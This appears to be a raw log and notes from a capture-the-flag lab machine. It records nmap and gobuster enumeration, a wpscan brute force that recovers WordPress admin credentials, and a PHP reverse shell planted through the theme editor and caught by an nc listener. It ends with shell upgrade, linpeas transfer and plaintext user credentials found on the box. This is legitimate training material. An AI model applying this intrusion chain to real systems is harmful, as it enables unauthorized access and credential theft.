

Target IP Address -> 10.201.96.10



root@ip-10-201-47-1:~# nmap -sV -sT 10.201.96.10
Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-04 10:07 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.201.96.10
Host is up (0.0018s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 16:FF:EA:8C:F8:47 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.15 seconds
root@ip-10-201-47-1:~# 


root@ip-10-201-47-1:~# telnet 10.201.96.10 22
Trying 10.201.96.10...
Connected to 10.201.96.10.
Escape character is '^]'.
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
root@ip-10-201-47-1:~#


root@ip-10-201-47-1:~# telnet 10.201.96.10 80
Trying 10.201.96.10...
Connected to 10.201.96.10.
Escape character is '^]'.
GET / HTTP/1.0

HTTP/1.1 200 OK
Date: Tue, 04 Nov 2025 10:09:09 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Mon, 03 Aug 2020 01:49:20 GMT
ETag: "2aa6-5abef58e962a5"
Accept-Ranges: bytes
Content-Length: 10918
Vary: Accept-Encoding
Connection: close
Content-Type: text/html



root@ip-10-201-47-1:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.201.96.10
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.96.10
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/blog                 (Status: 301) [Size: 311] [--> http://10.201.96.10/blog/]
/index.html           (Status: 200) [Size: 10918]
/javascript           (Status: 301) [Size: 317] [--> http://10.201.96.10/javascript/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.201.96.10/phpmyadmin/]
/server-status        (Status: 403) [Size: 277]
/wordpress            (Status: 301) [Size: 316] [--> http://10.201.96.10/wordpress/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
root@ip-10-201-47-1:~# 



root@ip-10-201-47-1:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.201.96.10/wordpress/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.96.10/wordpress/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/index.php            (Status: 301) [Size: 0] [--> http://10.201.96.10/wordpress/]
/wp-admin             (Status: 301) [Size: 325] [--> http://10.201.96.10/wordpress/wp-admin/]
/wp-includes          (Status: 301) [Size: 328] [--> http://10.201.96.10/wordpress/wp-includes/]
/wp-content           (Status: 301) [Size: 327] [--> http://10.201.96.10/wordpress/wp-content/]
/xmlrpc.php           (Status: 405) [Size: 42]

===============================================================
Finished
===============================================================
root@ip-10-201-47-1:~# 


used wpscan to enumerate valid usernames on wp-admin login

wpscan --url http://internal.thm/blog/ -e vp,u
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <======================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin

used wpscan to bruteforce login on wp-admin

root@ip-10-201-47-1:~# wpscan --url http://internal.thm/blog/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt 

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                                                                         
Trying admin / princess7 Time: 00:00:37 <                                                                                                  > (3885 / 14348276)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys


once signed into wp-admin, opened theme editor and replaced archives.php with reverse php shell code -> https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
started nc listener
then browsed to -> http://internal.thm/blog/wp-content/themes/twentyseventeen/archive.php to intiate reverse php shell


root@ip-10-201-47-1:~# nc -lvnp 8080
Listening on 0.0.0.0 8080
Connection received on 10.201.96.10 54154
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 11:23:27 up  1:19,  0 users,  load average: 0.00, 0.13, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$  

used python to spawn interactive shell

$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@internal:/$ whoami
whoami
www-data
www-data@internal:/$ ssh root@localhost 
ssh root@localhost
Could not create directory '/var/www/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:fJ/BlTrDF8wS8/eqyoej1aq/NmvQh79ABdkpiiN5tqE.
Are you sure you want to continue connecting (yes/no)? no
no
Host key verification failed.
www-data@internal:/$ 


used python webserver from attackbox to transfer linpeas to host
executed and looking for any potential escalation point


found text file containing user login details


aubreanna@internal:/tmp$ cd /opt/
aubreanna@internal:/opt$ ls
containerd  wp-save.txt
aubreanna@internal:/opt$ cat wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
aubreanna@internal:/opt$ 

no sudo permissions

aubreanna@internal:/opt$ sudo -l
[sudo] password for aubreanna: 
Sorry, user aubreanna may not run sudo on internal.
aubreanna@internal:/opt$ 














































































































































































































































































































































































































































































































































